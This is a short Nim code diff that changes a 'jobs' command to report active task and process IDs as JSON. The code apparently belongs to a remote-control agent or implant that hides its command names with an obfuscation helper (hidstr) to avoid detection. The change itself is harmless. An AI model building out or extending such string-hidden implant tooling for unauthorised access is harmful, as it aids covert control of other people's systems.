@@ -7,13 +7,16 @@ import crypto/strenc
 proc jobsExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
   let active = jobActiveList()
-  if active.len == 0:
-    return TaskResult(output: "No active jobs.", status: "success", completed: true)
-  var lines: seq[string] = @["Active interactive jobs:"]
+  let jobsArr = newJArray()
   for tid in active:
     let pid = jobPid(tid)
-    lines.add("  task_id=" & tid & "  pid=" & $pid)
-  return TaskResult(output: lines.join("\n"), status: "success", completed: true)
+    var entry = newJObject()
+    entry["task_id"] = %tid
+    entry["pid"] = %pid
+    jobsArr.add(entry)
+  var res = newJObject()
+  res["jobs"] = jobsArr
+  return TaskResult(output: $res, status: "success", completed: true)
 
 proc initJobs*() =
   register(hidstr("jobs"), jobsExecute)
